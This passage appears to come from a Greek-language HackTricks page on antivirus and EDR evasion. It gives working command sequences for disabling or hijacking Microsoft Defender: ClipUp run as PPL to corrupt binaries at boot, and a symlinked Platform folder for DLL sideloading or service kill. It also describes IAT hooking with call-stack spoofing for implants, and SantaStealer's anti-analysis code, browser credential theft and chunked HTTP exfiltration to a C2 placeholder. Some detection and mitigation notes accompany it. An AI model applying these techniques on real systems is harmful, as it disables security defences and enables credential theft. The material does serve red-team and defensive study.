3) Εάν το στοχευόμενο binary είναι κανονικά ανοιχτό/κλειδωμένο από τον AV κατά την εκτέλεση (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση πριν ξεκινήσει ο AV εγκαθιστώντας μια υπηρεσία αυτόματης εκκίνησης που εκτελείται αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με Process Monitor (boot logging).
4) Σε επανεκκίνηση, η εγγραφή με PPL υποστήριξη συμβαίνει πριν ο AV κλειδώσει τα binaries του, καταστρέφοντας το στοχευόμενο αρχείο και αποτρέποντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε το περιεχόμενο που γράφει το ClipUp πέρα από τη θέση· το primitive είναι κατάλληλο για αλλοίωση παρά για ακριβή ένεση περιεχομένου.
- Απαιτεί τοπικό admin/SYSTEM για εγκατάσταση/εκκίνηση υπηρεσίας και παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει κλειδώματα αρχείων.

Ανιχνεύσεις
- Δημιουργία διεργασίας του `ClipUp.exe` με ασυνήθιστα επιχειρήματα, ειδικά όταν έχει ως γονέα μη-τυπικούς launchers, γύρω από την εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες να auto-start ύποπτα binaries και που ξεκινούν συστηματικά πριν το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από σφάλματα εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για Defender binaries/Platform directories· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με flags protected-process.
- ETW/EDR τηλεμετρία: αναζητήστε διεργασίες που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδου PPL από non-AV binaries.

Μέτρα αντιμετώπισης
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να τρέξουν ως PPL και υπό ποιους γονείς· μπλοκάρετε την κλήση του ClipUp εκτός νόμιμων συμφραζομένων.
- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start υπηρεσιών και παρακολουθήστε χειραγώγηση της σειράς εκκίνησης.
- Ενεργοποιήστε το Defender tamper protection και τα early-launch protections· ερευνήστε σφάλματα εκκίνησης που υποδεικνύουν καταστροφή binaries.
- Σκεφτείτε την απενεργοποίηση της δημιουργίας short-name 8.3 σε volumes που φιλοξενούν εργαλεία ασφάλειας, αν είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

Αναφορές για PPL και εργαλεία
- Επισκόπηση Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Αναφορά EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (επικύρωση σειράς): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Τεχνική writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Παρέμβαση του Microsoft Defender μέσω Platform Version Folder Symlink Hijack

Ο Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται, απαριθμώντας τους υποφακέλους κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με το λεξικογραφικά υψηλότερο string έκδοσης (π.χ., `4.18.25070.5-0`), και στη συνέχεια εκκινεί τις διεργασίες υπηρεσίας του Defender από εκεί (ενημερώνοντας αναλόγως τα service/registry μονοπάτια). Αυτή η επιλογή εμπιστεύεται τις καταχωρίσεις καταλόγου συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να εκμεταλλευτεί αυτό για να ανακατευθύνει τον Defender σε ένα attacker-writable path και να πετύχει DLL sideloading ή διακοπή υπηρεσίας.

Προϋποθέσεις
- Local Administrator (απαιτείται για να δημιουργήσει directories/symlinks υπό τον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή ενεργοποίησης επαναεπιλογής πλατφόρμας Defender (επανεκκίνηση υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (mklink)

Γιατί λειτουργεί
- Ο Defender μπλοκάρει εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις καταχωρίσεις καταλόγου και επιλέγει την λεξικογραφικά υψηλότερη έκδοση χωρίς να επαληθεύει ότι ο προορισμός επιλύεται σε προστατευμένη/εμπιστευμένη διαδρομή.

Βήμα-βήμα (παράδειγμα)
1) Προετοιμάστε ένα εγγράψιμο clone του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε ένα symlink προς κατάλογο υψηλότερης έκδοσης μέσα στον Platform που δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή ενεργοποίησης (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επιβεβαιώστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε το νέο μονοπάτι διεργασίας κάτω από `C:\TMP\AV\` και τη διαμόρφωση/registry της υπηρεσίας να αντανακλά αυτή τη θέση.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs που ο Defender φορτώνει από τον application directory του ώστε να execute code στις διαδικασίες του Defender. Δείτε την ενότητα παραπάνω: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Αφαιρέστε το version-symlink ώστε στην επόμενη εκκίνηση το configured path να μην επιλύεται και ο Defender να αποτυγχάνει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει privilege escalation από μόνη της· απαιτεί admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι Red teams μπορούν να μεταφέρουν την runtime evasion εκτός του C2 implant και μέσα στο ίδιο το target module κάνοντας hook στον Import Address Table (IAT) και κατευθύνοντας επιλεγμένα APIs μέσω attacker-controlled, position‑independent code (PIC). Αυτό γενικεύει την αποφυγή ανίχνευσης πέρα από τη μικρή επιφάνεια API που εκθέτουν πολλά kits (π.χ., CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Operational integration
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Detection/DFIR considerations
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## Τεχνικές SantaStealer για Fileless Evasion και Κλοπή Διαπιστευτηρίων

Το SantaStealer (aka BluelineStealer) δείχνει πώς οι σύγχρονοι info-stealers συνδυάζουν AV bypass, anti-analysis και πρόσβαση σε διαπιστεύσεις σε μια ενιαία ροή εργασίας.

### Φιλτράρισμα διάταξης πληκτρολογίου & καθυστέρηση sandbox

- Ένα config flag (`anti_cis`) απαριθμεί τις εγκατεστημένες διατάξεις πληκτρολογίου μέσω του `GetKeyboardLayoutList`. Αν βρεθεί Cyrillic layout, το δείγμα drops ένα κενό `CIS` marker και τερματίζει πριν τρέξει τους stealers, εξασφαλίζοντας ότι δεν detonates ποτέ σε αποκλεισμένες τοπικές ρυθμίσεις ενώ αφήνει ένα hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Πολυεπίπεδη λογική `check_antivm`

- Variant A διατρέχει τη λίστα διεργασιών, υπολογίζει hash κάθε ονόματος με ένα προσαρμοσμένο rolling checksum και το συγκρίνει με ενσωματωμένες blocklists για debuggers/sandboxes· επαναλαμβάνει το checksum πάνω στο όνομα υπολογιστή και ελέγχει καταλόγους εργασίας όπως `C:\analysis`.
- Variant B επιθεωρεί ιδιότητες συστήματος (process-count floor, recent uptime), καλεί `OpenServiceA("VBoxGuest")` για να εντοπίσει VirtualBox additions και εκτελεί timing checks γύρω από sleeps για να εντοπίσει single-stepping. Οποιοδήποτε hit ακυρώνει την εκτέλεση πριν φορτώσουν τα modules.

### Fileless helper + double ChaCha20 reflective loading

- Το κύριο DLL/EXE ενσωματώνει έναν Chromium credential helper που είτε απορρίπτεται στο δίσκο είτε γίνεται χειροκίνητο mapping in-memory· το fileless mode επιλύει imports/relocations μόνο του ώστε να μην γραφτούν helper artifacts.
- Αυτός ο helper αποθηκεύει ένα DLL δεύτερου σταδίου κρυπτογραφημένο δύο φορές με ChaCha20 (δύο 32-byte keys + 12-byte nonces). Μετά τις δύο διεργασίες, φορτώνει reflectively το blob (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` που προέρχονται από [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Οι ρουτίνες ChromElevator χρησιμοποιούν direct-syscall reflective process hollowing για inject σε έναν ζωντανό Chromium browser, κληρονομούν AppBound Encryption keys και αποκρυπτογραφούν passwords/cookies/credit cards απευθείας από SQLite βάσεις δεδομένων παρά το ABE hardening.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` διατρέχει έναν global `memory_generators` function-pointer πίνακα και spawnάρει ένα thread ανά ενεργό module (Telegram, Discord, Steam, screenshots, documents, browser extensions, κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε shared buffers και αναφέρει τον αριθμό αρχείων του μετά από ~45s join window.
- Μόλις ολοκληρωθεί, όλα συμπιέζονται με τη statically linked `miniz` library ως `%TEMP%\\Log.zip`. Το `ThreadPayload1` ύστερα sleeps 15s και streamάρει το archive σε κομμάτια των 10 MB μέσω HTTP POST στο `http://<C2>:6767/upload`, προσποιούμενο browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικό `w: <campaign_tag>`, και το τελευταίο chunk επισυνάπτει `complete: true` ώστε το C2 να γνωρίζει ότι η επανασυναρμολόγηση ολοκληρώθηκε.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
